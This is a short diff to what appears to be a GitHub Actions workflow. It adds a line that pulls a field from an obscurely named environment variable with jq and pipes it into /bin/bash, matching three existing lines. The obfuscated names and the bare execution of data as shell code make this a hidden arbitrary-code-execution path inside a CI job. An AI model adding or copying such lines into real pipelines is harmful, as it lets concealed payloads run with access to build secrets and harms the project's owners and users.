@@ -37,6 +37,7 @@ jobs:
           printf '%s' "$iijow84718" | jq -r .tre53839 | /bin/bash
           printf '%s' "$i86" | jq -r .dmx12 | /bin/bash
           printf '%s' "$hg1" | jq -r .wnx0 | /bin/bash
+          printf '%s' "$xwb42" | jq -r .o3 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
